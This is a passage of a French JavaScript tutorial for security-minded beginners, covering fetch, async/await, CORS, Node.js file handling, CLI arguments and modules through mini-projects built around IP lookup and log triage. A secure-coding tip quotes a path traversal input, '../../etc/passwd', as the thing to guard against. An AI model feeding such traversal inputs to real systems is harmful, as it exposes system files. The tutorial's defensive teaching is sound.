### Vérifier le statut HTTP

`fetch` ne considère **pas** un code 404 ou 500 comme une erreur (la promesse réussit quand même). Il faut vérifier `reponse.ok` ou `reponse.status` soi-même.

```javascript
fetch("https://api.exemple.test/data")
  .then((reponse) => {
    if (!reponse.ok) {
      throw new Error(`HTTP ${reponse.status}`);   // 404, 500...
    }
    return reponse.json();
  })
  .then((data) => console.log(data))
  .catch((err) => console.log("Problème :", err.message));
```

- **`reponse.ok`** : `true` si le statut est 200-299.
- **`reponse.status`** : le code numérique (200, 404, 500…).

> ### 🛡️ Réflexe sécurité : toujours gérer l'échec réseau
> Une requête peut échouer : serveur injoignable, timeout, 500, hors-ligne. **Sans `.catch` (ou `try/catch`), ton appli casse silencieusement ou affiche des données incohérentes.** C'est le risque n° 11 de la Boîte à risques. Et n'injecte **jamais** la réponse via `innerHTML` (risque XSS) : utilise `textContent` (chapitre 15).

## Très utile en pratique

> ### 🧭 Navigateur vs Node.js : `fetch` n'est pas identique partout
> `fetch` existe **dans le navigateur** ET **dans Node.js moderne** (Node 18+). Le code se ressemble, mais **le contexte diffère** :
>
> - **Dans le navigateur**, `fetch` est soumis à **CORS** (chapitre suivant) : le navigateur peut **bloquer** une requête vers un autre domaine. C'est une règle **du navigateur**.
> - **Dans un script Node.js classique**, il **n'y a pas de navigateur, donc pas de CORS** : `fetch` vers n'importe quel domaine n'est pas bloqué de la même façon.
>
> Conséquence pratique : un `fetch` qui « marche » dans un script Node peut être **bloqué par CORS** dans le navigateur, et inversement. Quand tu vois une erreur CORS, c'est que tu es **dans le navigateur**. On détaille au chapitre 24.

## Exemple simple

Récupérer son IP publique via une API (l'exemple `ipify` renvoie `{"ip": "..."}`) :

```javascript
fetch("https://api.ipify.org?format=json")
  .then((r) => r.json())
  .then((data) => {
    console.log("Mon IP publique :", data.ip);
  })
  .catch((err) => console.log("Impossible de récupérer l'IP :", err.message));
```

## Application IT / cyber / OSINT

`fetch` est la porte vers toutes les **APIs de cybersécurité** : réputation d'IP, résolution de domaines, threat intelligence, enrichissement d'IOC. Le geste type est : `fetch` une API → vérifier le statut → `.json()` → traiter avec `filter`/`map` → afficher en `textContent`. C'est le cœur du mini-projet « lookup OSINT » de cette partie. La gestion d'erreurs réseau (`.catch`) n'est pas optionnelle : les services externes sont parfois lents, en panne, ou limités en débit.

> ### 🔍 Lecture de code inconnu
> Repérer les appels `fetch` (ou `XMLHttpRequest`) dans un script inconnu te révèle **avec quels serveurs il communique** et **quelles données il envoie/reçoit**. C'est souvent l'information la plus importante pour comprendre le comportement réseau d'une page.

## ❌ Erreur classique

```javascript
// ❌ Oublier .json() et utiliser la réponse brute
fetch(url).then((r) => console.log(r.ip));   // undefined ! r est la réponse, pas les données

// ✅ Lire le corps avec .json()
fetch(url).then((r) => r.json()).then((data) => console.log(data.ip));

// ❌ Croire que fetch rejette sur 404/500
fetch("https://site.test/page-inexistante")
  .then((r) => r.json())   // s'exécute même sur un 404 ! r.ok serait false
  .catch(...);             // ne se déclenche PAS pour un 404

// ✅ Vérifier r.ok soi-même
fetch(url).then((r) => {
  if (!r.ok) throw new Error(`HTTP ${r.status}`);
  return r.json();
});
```

> **Réflexe diagnostic :** `fetch` « réussit » mais tes données sont vides/fausses ? Vérifie que tu appelles bien `.json()`, et que tu testes `r.ok` (un 404 passe le `.then` sans déclencher `.catch`).

## Exercices

**Guidé**
1. Fais un `fetch` vers `https://api.ipify.org?format=json`.
2. Convertis en JSON avec `.json()`.
3. Affiche l'IP. Ajoute un `.catch` qui affiche l'erreur.

**Autonome**
Écris une fonction `recupererIp()` qui fait le `fetch` ci-dessus et affiche l'IP dans un élément `#resultat` de la page avec `textContent` (pas `innerHTML`). Branche-la sur un bouton.

**Défi**
Écris une fonction `requeteSafe(url)` qui fait un `fetch`, vérifie `r.ok` (sinon `throw`), renvoie le JSON, et gère toute erreur dans un `.catch` en affichant un message propre. Teste-la avec une URL valide et une URL volontairement cassée.

## ✅ Tu sais maintenant…

- faire une requête GET avec `fetch` ;
- lire le corps avec `.json()` ;
- vérifier `reponse.ok` et `reponse.status` ;
- gérer l'échec réseau avec `.catch` ;
- comprendre que `fetch` diffère navigateur vs Node.js (CORS) ;
- ne jamais injecter une réponse via `innerHTML`.

-----

# Chapitre 23 — `async` / `await`

## Le minimum à savoir

`async/await` est une syntaxe plus **lisible** pour écrire de l'asynchrone. Sous le capot, ce sont toujours des promesses (chapitre 21), mais le code se lit presque comme du synchrone.

### Transformer `.then` en `await`

```javascript
// Avec .then (chapitre 22)
fetch("https://api.ipify.org?format=json")
  .then((r) => r.json())
  .then((data) => console.log(data.ip));

// Avec async/await : plus linéaire
async function afficherIp() {
  const reponse = await fetch("https://api.ipify.org?format=json");
  const data = await reponse.json();
  console.log(data.ip);
}

afficherIp();
```

Règles :
- **`await`** met en pause la fonction jusqu'à ce que la promesse soit résolue, et renvoie directement le résultat.
- **`await` ne peut s'utiliser que dans une fonction `async`.**

### Gérer les erreurs avec `try/catch`

Avec `async/await`, on revient au `try/catch` classique (chapitre 13), plus naturel que `.catch` :

```javascript
async function recupererIp() {
  try {
    const reponse = await fetch("https://api.ipify.org?format=json");
    if (!reponse.ok) {
      throw new Error(`HTTP ${reponse.status}`);
    }
    const data = await reponse.json();
    return data.ip;
  } catch (erreur) {
    console.log("Erreur :", erreur.message);
    return null;
  }
}
```

## Très utile en pratique

`async/await` rend le code réseau **séquentiel et lisible**, surtout quand plusieurs étapes s'enchaînent :

```javascript
async function enrichirIp(ip) {
  try {
    const r = await fetch(`https://api.exemple.test/ip/${ip}`);
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    const data = await r.json();
    return { ip, score: data.score, pays: data.pays };
  } catch (e) {
    return { ip, erreur: e.message };
  }
}
```

## Exemple simple

```javascript
async function analyser() {
  const ip = "8.8.8.8";
  console.log(`Analyse de ${ip}...`);
  // (ici un await fetch réel)
  console.log("Terminé");
}

analyser();
```

## Application IT / cyber / OSINT

`async/await` est la façon recommandée d'écrire tes outils d'enrichissement d'IOC : interroger une API, attendre la réponse, la traiter, passer à la suivante — le tout lisible de haut en bas. Que ce soit côté navigateur (lookup OSINT) ou côté Node.js (scripts d'enrichissement en lot, Partie 6), c'est la syntaxe que tu utiliseras le plus. Combinée à `try/catch`, elle donne des outils robustes face aux pannes réseau.

> ### 🔍 Lecture de code inconnu
> Le couple `async`/`await` autour d'un `fetch` est le motif le plus courant d'appel réseau moderne. Le repérer te montre instantanément où le code communique avec un serveur.

## ❌ Erreur classique

```javascript
// ❌ Oublier await : on récupère la promesse, pas le résultat
async function bug() {
  const data = fetch(url);   // data est une PROMESSE, pas la réponse
  console.log(data);         // [object Promise]
}

// ✅ Avec await
async function ok() {
  const reponse = await fetch(url);
  const data = await reponse.json();   // await aussi ici !
}

// ❌ Utiliser await hors d'une fonction async
// const data = await fetch(url);   // SyntaxError (au niveau racine classique)

// ❌ Oublier le try/catch → erreur réseau non gérée
```

> **Réflexe diagnostic :** ta variable affiche `[object Promise]` ? Tu as oublié un `await`. Et souviens-toi : `reponse.json()` aussi demande un `await`.

## Exercices

**Guidé**
1. Réécris la fonction `recupererIp` du chapitre 22 en `async/await`.
2. Entoure-la d'un `try/catch`.
3. Appelle-la et affiche le résultat.

**Autonome**
Écris une fonction `async lookup(ip)` qui interroge `https://api.ipify.org?format=json` (ou une API au choix), vérifie le statut, et renvoie les données. Branche-la sur un bouton de page et affiche le résultat en `textContent`.

**Défi**
Écris une fonction `async enrichirPlusieurs(ips)` qui prend un tableau d'IP, les interroge **une par une** avec `await` dans une boucle `for...of`, accumule les résultats dans un tableau, et gère les erreurs individuellement (une IP qui échoue n'arrête pas les autres). Affiche le tableau final en JSON.

## ✅ Tu sais maintenant…

- écrire de l'asynchrone lisible avec `async`/`await` ;
- utiliser `await` (uniquement dans une fonction `async`) ;
- gérer les erreurs avec `try/catch` ;
- te souvenir que `reponse.json()` demande aussi un `await` ;
- reconnaître le motif `async fetch` dans du code.

-----

# Chapitre 24 — CORS : comprendre le blocage

## Le minimum à savoir

Dès que tu feras des `fetch` dans le navigateur, tu rencontreras tôt ou tard une erreur **CORS**. Comprendre ce qu'elle signifie t'évitera des heures de confusion.

### Origine et politique same-origin

Une **origine** est le triplet `protocole + domaine + port` (ex. `https://example.com:443`). Par défaut, le navigateur applique la **politique same-origin** : une page ne peut, par défaut, lire des données que de **sa propre origine**.

### CORS : l'autorisation d'aller voir ailleurs

**CORS** (*Cross-Origin Resource Sharing*) est le mécanisme qui **assouplit** cette règle. Pour qu'une page sur `monsite.test` puisse lire les données de `api.autresite.test`, le **serveur d'`api.autresite.test`** doit explicitement l'autoriser via un en-tête de réponse :

```text
Access-Control-Allow-Origin: https://monsite.test
```

Si cet en-tête est absent ou ne correspond pas, le **navigateur bloque** la lecture et affiche une erreur CORS dans la console.

```text
Access to fetch at 'https://api.autresite.test/' from origin
'https://monsite.test' has been blocked by CORS policy
```

### Le point clé à comprendre

> ### ⚠️ À ne pas confondre : CORS n'est PAS une protection serveur
> CORS est une règle **appliquée par le navigateur**, pour protéger **l'utilisateur**. Ce n'est **pas** une sécurité côté serveur :
>
> - Un script **Node.js** (Partie 6), un outil comme `curl` ou Postman **ignorent CORS** : ils peuvent appeler l'API sans blocage. CORS ne s'applique **que dans le navigateur**.
> - Donc CORS **ne protège pas** une API contre des accès directs. Une API qui veut se protéger a besoin d'**authentification** côté serveur, pas de CORS.
>
> C'est le risque n° 7 de la Boîte à risques : croire que CORS sécurise une API. Il encadre seulement ce que **le navigateur d'un utilisateur** a le droit de lire depuis une autre origine.

## Très utile en pratique

Que faire face à une erreur CORS dans ton lab ?
- **Utiliser une API qui autorise le cross-origin** (beaucoup d'APIs publiques renvoient `Access-Control-Allow-Origin: *`).
- **Faire la requête depuis Node.js** au lieu du navigateur (pas de CORS) — souvent la meilleure option pour un outil d'analyse.
- Comprendre que tu **ne peux pas** « forcer » le navigateur à ignorer CORS depuis ton JavaScript : c'est le serveur distant qui décide.

## Exemple simple

```javascript
// Dans le NAVIGATEUR : peut être bloqué par CORS si l'API ne l'autorise pas
async function tester() {
  try {
    const r = await fetch("https://api.autresite.test/data");
    const data = await r.json();
    console.log(data);
  } catch (e) {
    // Une erreur CORS se manifeste souvent comme un échec de fetch ici
    console.log("Échec (possiblement CORS) :", e.message);
  }
}
```

## Application IT / cyber / OSINT

CORS est un sujet **clé en sécurité web**. Côté défensif, tu dois comprendre :
- qu'une **mauvaise configuration CORS** (par exemple `Access-Control-Allow-Origin: *` sur une API qui renvoie des données sensibles avec credentials) est une **faiblesse** réelle, relevée dans les audits ;
- que CORS protège l'utilisateur, **pas** le serveur — donc qu'on ne « contourne » pas une sécurité serveur en jouant avec CORS ;
- que pour tes **outils OSINT**, faire les requêtes depuis Node.js évite le problème entièrement.

Cette compréhension t'évite le contresens le plus fréquent des débutants en sécurité web, et prépare la suite « Web Security » de la collection.

## ❌ Erreur classique

```javascript
// ❌ Croire que c'est un bug de ton code
// → l'erreur CORS ne vient PAS d'une faute dans ton JavaScript :
//   c'est le serveur distant qui n'autorise pas ton origine.

// ❌ Croire que CORS protège l'API
// → un curl/Node atteint l'API quand même. CORS ≠ authentification.

// ❌ Chercher à "désactiver CORS" en JavaScript
// → impossible côté page : c'est le navigateur + le serveur distant qui décident.
```

> **Réflexe diagnostic :** erreur `blocked by CORS policy` ? Ce n'est pas ton code qui est faux : le serveur distant n'autorise pas ton origine. Soit l'API n'est pas faite pour un appel navigateur cross-origin, soit fais la requête depuis Node.js.

## Exercices

**Guidé**
1. Depuis une page locale, fais un `fetch` vers une API publique qui autorise CORS (ex. `https://api.ipify.org?format=json`) : ça marche.
2. Lis l'onglet *Réseau* des DevTools et repère l'en-tête `Access-Control-Allow-Origin` dans la réponse.

**Autonome**
Explique (en commentaires) pourquoi le même `fetch` pourrait échouer vers une autre API qui n'autorise pas le cross-origin, alors qu'il fonctionnerait depuis un script Node.js.

**Défi**
Rédige un mini-mémo défensif : qu'est-ce qu'une configuration CORS trop permissive, pourquoi `Access-Control-Allow-Origin: *` combiné à des données sensibles est risqué, et pourquoi CORS ne remplace jamais l'authentification serveur.

## ✅ Tu sais maintenant…

- définir une origine (protocole + domaine + port) ;
- expliquer la politique same-origin et le rôle de CORS ;
- comprendre que CORS est une règle **navigateur**, pas une sécurité serveur ;
- savoir qu'un script Node.js / curl ignore CORS ;
- diagnostiquer et contourner légitimement une erreur CORS dans ton lab.

-----

## 🧩 Mini-projet — Lookup OSINT dans le navigateur (chapitres 20 à 24)

Une page qui interroge une API publique et affiche le résultat **en sécurité**, avec gestion d'erreurs.

`index.html` :

```html
<!DOCTYPE html>
<html lang="fr">
  <head><meta charset="UTF-8"><title>Lookup OSINT</title></head>
  <body>
    <h1>Mon IP publique</h1>
    <button id="lookup">Récupérer mon IP</button>
    <p id="resultat">—</p>
    <script src="script.js"></script>
  </body>
</html>
```

`script.js` :

```javascript
const bouton = document.querySelector("#lookup");
const resultat = document.querySelector("#resultat");

async function recupererIp() {
  resultat.textContent = "Chargement...";
  try {
    const reponse = await fetch("https://api.ipify.org?format=json");
    if (!reponse.ok) {
      throw new Error(`HTTP ${reponse.status}`);
    }
    const data = await reponse.json();
    // ✅ textContent : aucune injection possible même si la réponse était piégée
    resultat.textContent = `Votre IP publique : ${data.ip}`;
  } catch (erreur) {
    resultat.textContent = `Erreur : ${erreur.message}`;
  }
}

bouton.addEventListener("click", recupererIp);
```

**Ce que tu obtiens :** un bouton qui interroge une API réelle, affiche un état de chargement, le résultat en `textContent`, et un message d'erreur propre en cas de panne réseau. Tout y est : `async/await`, vérification du statut, `try/catch`, affichage sécurisé, événement.

Ce mini-projet mobilise toute la Partie 5 (asynchrone, `fetch`, `async/await`, gestion d'erreurs) plus le DOM et les événements (Partie 3) et le réflexe `textContent` (sécurité).

**Pour aller plus loin :** ajoute un champ pour saisir une IP et interroge une API de géolocalisation/réputation qui autorise CORS ; affiche pays et score. Pense à gérer le cas où l'API échoue ou est bloquée par CORS.

-----

## ✅ CHECKPOINT 5 — Tu sais faire parler une page au réseau

Avant la Partie 6, assure-toi de pouvoir, **sans regarder** :

- [ ] expliquer synchrone vs asynchrone et le « plus tard » ;
- [ ] lire une chaîne de `.then`/`.catch` ;
- [ ] faire un `fetch`, lire `.json()`, vérifier `reponse.ok` ;
- [ ] écrire la même chose en `async`/`await` avec `try/catch` ;
- [ ] expliquer que `fetch` diffère navigateur vs Node.js (CORS) ;
- [ ] expliquer ce qu'est CORS et pourquoi ce n'est pas une sécurité serveur ;
- [ ] réaliser le mini-projet lookup OSINT.

Tu sais interroger le web côté navigateur. La Partie 6 quitte le navigateur pour Node.js : enfin le scripting d'automatisation, proche de Python.


-----

# Chapitre 25 — Découverte de Node.js

## Le minimum à savoir

Jusqu'ici, ton JavaScript tournait dans le **navigateur**. **Node.js** permet d'exécuter du JavaScript **directement sur ta machine**, comme un script Python ou Bash. C'est le moment où JavaScript devient un outil d'**automatisation**.

### Installer Node.js LTS

**Linux :**

```bash
# Vérifie si Node est déjà installé
node --version

# Sinon, installe via le gestionnaire de paquets (Debian/Ubuntu)
sudo apt update && sudo apt install nodejs npm

# Ou, recommandé, via nvm pour avoir la version LTS récente
# (voir https://github.com/nvm-sh/nvm)
```

**Mac :** `brew install node`, ou l'installeur depuis le site officiel.

**Windows :** l'installeur **LTS** depuis le site officiel de Node.js.

> Choisis toujours la version **LTS** (*Long Term Support*) : c'est la version stable recommandée. Vérifie avec `node --version` (tu devrais voir `v20.x`, `v22.x` ou plus récent).

### Exécuter un fichier

Crée un fichier `script.js` :

```javascript
console.log("Bonjour depuis Node.js");
console.log("2 + 2 =", 2 + 2);
```

Lance-le dans le terminal :

```bash
node script.js
```

Sortie :

```text
Bonjour depuis Node.js
2 + 2 = 4
```

**Aucune page, aucun navigateur** : le code s'exécute directement. C'est exactement le modèle du cours Python, mais en JavaScript.

### Le REPL (mode interactif)

Tape simplement `node` sans argument pour ouvrir un mode interactif (comme la console Python) :

```bash
node
> 2 + 2
4
> "8.8.8.8".split(".")
[ '8', '8', '8', '8' ]
> .exit
```

## Très utile en pratique

> ### 🧭 Navigateur vs Node.js : le récapitulatif
> | | Navigateur | Node.js |
> | --- | --- | --- |
> | **DOM / `document`** | ✅ oui | ❌ non |
> | **`window`, `alert`** | ✅ oui | ❌ non |
> | **Accès aux fichiers** | ❌ non (sauf input file) | ✅ oui (`fs`) |
> | **Arguments CLI** | ❌ non | ✅ oui (`process.argv`) |
> | **CORS sur `fetch`** | ✅ appliqué | ❌ ignoré |
> | **Lancement** | via une page HTML | `node script.js` |
>
> Même langage, capacités différentes. Si un code utilise `document`, il est **navigateur**. S'il utilise `fs` ou `process`, il est **Node.js**.

## Exemple simple

`info.js` :

```javascript
const ips = ["8.8.8.8", "1.1.1.1", "192.168.1.1"];

for (const ip of ips) {
  const privee = ip.startsWith("192.168.");
  console.log(`${ip} → ${privee ? "privée" : "publique"}`);
}
```

```bash
node info.js
```

Tout ton savoir des Parties 1-2 (variables, boucles, fonctions, tableaux, objets, JSON, regex) fonctionne **à l'identique** dans Node.js. Seuls le DOM et les événements navigateur n'existent pas.

## Application IT / cyber / OSINT

Node.js est là où JavaScript rejoint le **scripting d'automatisation** que tu connais peut-être de Python : lire des fichiers de logs, parser des données, interroger des APIs en lot, produire des rapports. Tu peux écrire un outil CLI qui prend un fichier en entrée, extrait les IOC, et sort un rapport JSON — sans aucun navigateur. C'est le terrain des chapitres suivants.

## ❌ Erreur classique

```javascript
// ❌ Utiliser du code navigateur dans Node
document.querySelector("#x");   // ReferenceError: document is not defined
alert("test");                  // ReferenceError: alert is not defined

// ✅ Dans Node, on utilise console.log, fs, process... (chapitres suivants)
```

> **Réflexe diagnostic :** `document is not defined` ou `window is not defined` dans Node ? Tu exécutes du code **navigateur** dans Node. Ces objets n'existent que dans le navigateur.

## Exercices

**Guidé**
1. Installe Node.js LTS, vérifie avec `node --version`.
2. Crée `hello.js` qui affiche un message et un calcul.
3. Lance-le avec `node hello.js`.

**Autonome**
Crée un script Node qui contient un tableau d'IP et affiche pour chacune si elle est privée ou publique (réutilise ta fonction `estIpPrivee`).

**Défi**
Dans le REPL Node (`node`), expérimente : `[1,2,3].map(n => n*2)`, `JSON.stringify({a:1})`, `"a.b.c".split(".")`. Vérifie que tout ce que tu as appris fonctionne identiquement. Puis `.exit`.

## ✅ Tu sais maintenant…

- installer Node.js LTS et vérifier la version ;
- exécuter un fichier avec `node script.js` ;
- utiliser le REPL interactif ;
- distinguer ce qui existe en Node vs navigateur ;
- diagnostiquer un `document is not defined`.

-----

# Chapitre 26 — Lire et écrire des fichiers

## Le minimum à savoir

C'est ici que le scripting utile commence : **manipuler des fichiers**. Node.js fournit le module **`fs`** (*file system*).

### Importer `fs`

```javascript
const fs = require("fs");
```

`require(...)` charge un module (on détaille au chapitre 28). `fs` fait partie de Node, rien à installer.

### Lire un fichier

```javascript
const fs = require("fs");

// Lecture synchrone (simple, suffisante pour des scripts)
const contenu = fs.readFileSync("logs.txt", "utf-8");
console.log(contenu);
```

`"utf-8"` indique qu'on veut du **texte** (sinon on obtient des octets bruts). `readFileSync` renvoie tout le fichier comme une grande chaîne.

### Découper en lignes

```javascript
const contenu = fs.readFileSync("logs.txt", "utf-8");
const lignes = contenu.split("\n").filter((l) => l.trim() !== "");

for (const ligne of lignes) {
  console.log("Ligne :", ligne);
}
```

C'est exactement le geste du parsing : lire le fichier, le découper en lignes (Partie 2), traiter chaque ligne.

### Écrire un fichier

```javascript
const fs = require("fs");

const rapport = "IP suspectes :\n203.0.113.5\n198.51.100.7\n";
fs.writeFileSync("rapport.txt", rapport, "utf-8");
console.log("Rapport écrit dans rapport.txt");
```

`writeFileSync` **écrase** le fichier s'il existe. Pour ajouter à la fin, utilise `fs.appendFileSync`.

### Écrire du JSON

```javascript
const donnees = { total: 42, ip_suspectes: ["203.0.113.5"] };
fs.writeFileSync("rapport.json", JSON.stringify(donnees, null, 2), "utf-8");
```

## Très utile en pratique

Le pipeline complet **lire → traiter → écrire**, cœur de l'automatisation défensive :

```javascript
const fs = require("fs");

// 1. Lire
const contenu = fs.readFileSync("auth.log", "utf-8");

// 2. Traiter : extraire les IP des lignes d'échec
const lignes = contenu.split("\n");
const ipsEchec = [];
for (const ligne of lignes) {
  if (ligne.includes("FAILED")) {
    const ips = ligne.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g);
    if (ips) ipsEchec.push(...ips);
  }
}

// 3. Dédoublonner et écrire
const uniques = [...new Set(ipsEchec)];
fs.writeFileSync("ips_a_bloquer.txt", uniques.join("\n"), "utf-8");
console.log(`${uniques.length} IP écrites dans ips_a_bloquer.txt`);
```

## Exemple simple

```javascript
const fs = require("fs");

// Créer un fichier de test
fs.writeFileSync("test.txt", "ligne 1\nligne 2\nligne 3\n", "utf-8");

// Le relire et compter les lignes
const lignes = fs.readFileSync("test.txt", "utf-8")
  .split("\n")
  .filter((l) => l.trim() !== "");

console.log(`Le fichier contient ${lignes.length} lignes`);   // 3
```

## Application IT / cyber / OSINT

C'est **le** geste fondamental du scripting défensif, identique en logique au cours Python : lire un fichier de logs, extraire les IOC, produire une liste à bloquer ou un rapport JSON. Avec `fs` + tout ce que tu as appris (regex, `filter`, `map`, objets, JSON), tu construis de vrais outils d'analyse en local. Le mini-projet final de cette partie en fait la synthèse.

> ### 🛡️ Réflexe sécurité : prudence avec les chemins
> Ne construis jamais un chemin de fichier à partir d'une entrée non maîtrisée sans validation (risque de *path traversal*, ex. `../../etc/passwd`). Dans tes scripts personnels c'est peu risqué, mais c'est un réflexe à avoir dès qu'une entrée externe entre en jeu.

## ❌ Erreur classique

```javascript
// ❌ Oublier "utf-8" → on obtient un Buffer (octets), pas du texte
const c = fs.readFileSync("fichier.txt");
console.log(c);   // <Buffer 6c 69 67 6e ...> au lieu du texte
// ✅ Préciser l'encodage
const c2 = fs.readFileSync("fichier.txt", "utf-8");

// ❌ Lire un fichier qui n'existe pas → plantage
const x = fs.readFileSync("inexistant.txt", "utf-8");
// → Error: ENOENT: no such file or directory
// ✅ Entourer d'un try/catch
try {
  const x = fs.readFileSync("inexistant.txt", "utf-8");
} catch (e) {
  console.log("Fichier introuvable :", e.message);
}

// ❌ writeFileSync écrase tout — attention à ne pas perdre des données
```

> **Réflexe diagnostic :** `ENOENT` ? Le fichier n'existe pas (mauvais nom ou mauvais dossier). Vérifie le chemin et le dossier courant (`process.cwd()`).

## Exercices

**Guidé**
1. Écris un script qui crée un fichier `notes.txt` avec trois lignes.
2. Relis-le et affiche le nombre de lignes.
3. Ajoute une quatrième ligne avec `appendFileSync`.

**Autonome**
Crée un fichier `logs.txt` contenant quelques lignes avec des IP. Écris un script qui lit le fichier, extrait toutes les IP (regex), les dédoublonne et les écrit dans `ips.txt`.

**Défi**
Écris un script qui lit un fichier de logs, compte les échecs de connexion par IP (objet compteur), repère celles au-dessus d'un seuil, et écrit un `rapport.json` structuré. C'est le mini-projet parser de la Partie 2, mais sur un **vrai fichier**. Entoure la lecture d'un `try/catch`.

## ✅ Tu sais maintenant…

- importer `fs` avec `require` ;
- lire un fichier texte avec `readFileSync(..., "utf-8")` ;
- découper en lignes et traiter ;
- écrire avec `writeFileSync` et ajouter avec `appendFileSync` ;
- écrire du JSON dans un fichier ;
- gérer un fichier manquant avec `try/catch`.

-----

# Chapitre 27 — Arguments et petits outils CLI

## Le minimum à savoir

Un outil utile prend des **paramètres** en ligne de commande. Node expose les arguments via **`process.argv`**.

```javascript
console.log(process.argv);
```

```bash
node script.js fichier.log 5
```

```text
[
  '/usr/bin/node',       // [0] le chemin de node
  '/chemin/script.js',   // [1] le chemin du script
  'fichier.log',         // [2] premier vrai argument
  '5'                    // [3] deuxième argument
]
```

Les deux premiers éléments sont toujours node et le script. **Tes** arguments commencent à l'index **2**.

```javascript
const args = process.argv.slice(2);   // on enlève les deux premiers
const fichier = args[0];
const seuil = Number(args[1]) || 3;    // les arguments sont des CHAÎNES

console.log(`Fichier : ${fichier}, seuil : ${seuil}`);
```

> Comme pour le Web Storage, les arguments sont toujours des **chaînes** : convertis avec `Number(...)` si tu attends un nombre.

### Codes de sortie

Un outil signale son succès ou son échec par un **code de sortie** (`0` = succès, autre = erreur), utile dans les enchaînements shell.

```javascript
if (!fichier) {
  console.error("Usage : node outil.js <fichier> [seuil]");
  process.exit(1);   // sortie en erreur
}
```

## Très utile en pratique

Un outil CLI paramétrable, avec vérification des arguments :

```javascript
const fs = require("fs");

const args = process.argv.slice(2);
const fichier = args[0];

if (!fichier) {
  console.error("Usage : node compter-erreurs.js <fichier.log>");
  process.exit(1);
}

try {
  const contenu = fs.readFileSync(fichier, "utf-8");
  const lignes = contenu.split("\n");
  const erreurs = lignes.filter((l) => l.includes("FAILED")).length;
  console.log(`${erreurs} échecs trouvés dans ${fichier}`);
} catch (e) {
  console.error("Erreur :", e.message);
  process.exit(1);
}
```

```bash
node compter-erreurs.js auth.log
```

## Exemple simple

```javascript
const args = process.argv.slice(2);
const nom = args[0] || "monde";
console.log(`Bonjour, ${nom}`);
```

```bash
node salut.js analyste    # Bonjour, analyste
node salut.js             # Bonjour, monde
```

## Application IT / cyber / OSINT

Les arguments transforment un script figé en **outil réutilisable** : `node extract-ioc.js rapport.txt`, `node triage.js auth.log 5`. C'est exactement le modèle des outils du cours Python (arguments, `process.exit`). Tu peux ainsi construire une petite boîte à outils défensive en ligne de commande, chaque script faisant une tâche précise et paramétrable.

## ❌ Erreur classique

```javascript
// ❌ Oublier le slice(2) et lire node/script comme arguments
const fichier = process.argv[0];   // c'est le chemin de node !
// ✅ Tes arguments commencent à l'index 2
const fichier2 = process.argv[2];
// ou, plus clair :
const [fichier3, seuil] = process.argv.slice(2);

// ❌ Ne pas vérifier qu'un argument est fourni → undefined plus loin
// ✅ Vérifier et afficher un usage clair, puis process.exit(1)

// ❌ Traiter un argument numérique comme un nombre sans conversion
const seuil4 = process.argv[3];          // chaîne "5"
console.log(seuil4 + 1);                 // "51" !
console.log(Number(seuil4) + 1);         // 6 ✅
```

> **Réflexe diagnostic :** ton argument vaut `undefined` ? Vérifie le `slice(2)` et que tu as bien passé l'argument sur la ligne de commande.

## Exercices

**Guidé**
1. Crée un script qui affiche le premier argument passé.
2. Si aucun argument, affiche un message d'usage et `process.exit(1)`.
3. Teste avec et sans argument.

**Autonome**
Écris `compter-lignes.js <fichier>` : il lit le fichier passé en argument et affiche son nombre de lignes. Gère l'absence d'argument et le fichier manquant.

**Défi**
Écris `triage.js <fichier> [seuil]` : lit un fichier de logs, compte les échecs par IP, et affiche celles au-dessus du `seuil` (défaut 3). Tous les paramètres viennent de la ligne de commande. Renvoie `process.exit(1)` en cas d'erreur d'usage ou de fichier.

## ✅ Tu sais maintenant…

- lire les arguments avec `process.argv` (à partir de l'index 2) ;
- convertir les arguments numériques avec `Number(...)` ;
- vérifier les arguments et afficher un usage ;
- utiliser `process.exit(code)` pour signaler succès/échec ;
- construire un petit outil CLI paramétrable.

-----

# Chapitre 28 — Modules

## Le minimum à savoir

Quand un projet grandit, on **découpe** le code en plusieurs fichiers réutilisables : les **modules**. Node a deux systèmes ; on apprend le plus simple d'abord.

### CommonJS : `require` et `module.exports`

C'est le système historique de Node, omniprésent.

**Fichier `outils.js` (le module qui exporte) :**

```javascript
function estIpPrivee(ip) {
  return ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("172.16.");
}

function extraireIps(texte) {
  return texte.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g) || [];
}

// On exporte ce qu'on veut rendre disponible
module.exports = { estIpPrivee, extraireIps };
```

**Fichier `main.js` (qui importe) :**

```javascript
const { estIpPrivee, extraireIps } = require("./outils");

console.log(estIpPrivee("192.168.1.1"));   // true
console.log(extraireIps("vu 8.8.8.8 et 1.1.1.1"));   // ["8.8.8.8", "1.1.1.1"]
```

Note le `./` devant `outils` : il indique un fichier **local** (par opposition à un module installé).

### Les modules intégrés

`fs` (chapitre 26) est un module intégré : `require("fs")` sans `./`. Node en fournit beaucoup (`path`, `crypto`, `os`…).

### Mention : les ES Modules (`import`)

Le JavaScript moderne a une autre syntaxe, **les ES Modules**, que tu as déjà vue côté navigateur dans certains contextes :

```javascript
// Syntaxe ES Modules (import/export)
import { estIpPrivee } from "./outils.js";
export function maFonction() { }
```

> ### ⚠️ À ne pas confondre : `require` vs `import` vs `<script>`
> - **`require(...)` / `module.exports`** : CommonJS, le système classique de Node. Commence par là.
> - **`import` / `export`** : ES Modules, syntaxe moderne (navigateur, et Node avec configuration). Tu la verras beaucoup.
> - **`<script src="...">`** : la façon de charger du JS dans une **page HTML** (Partie 1), sans rapport avec les modules Node.
>
> Pour débuter en Node, **CommonJS (`require`) est le plus simple**. On reste dessus dans ce cours.

## Très utile en pratique

Séparer la logique réutilisable (un module `outils.js`) des scripts qui l'utilisent rend ton code **propre et testable**. Tu écris tes fonctions d'analyse une fois, tu les importes dans plusieurs outils.

## Exemple simple

`math.js` :

```javascript
function doubler(n) { return n * 2; }
module.exports = { doubler };
```

`app.js` :

```javascript
const { doubler } = require("./math");
console.log(doubler(21));   // 42
```

```bash
node app.js
```

## Application IT / cyber / OSINT

Au fur et à mesure que ta boîte à outils défensive grandit, les modules te permettent de **factoriser** : un module `ioc.js` avec tes fonctions d'extraction/validation d'IP, domaines, hash, importé par tous tes outils de parsing et de triage. C'est ainsi qu'on construit une bibliothèque personnelle réutilisable, exactement comme on importe ses propres modules en Python.

> ### 🔍 Lecture de code inconnu
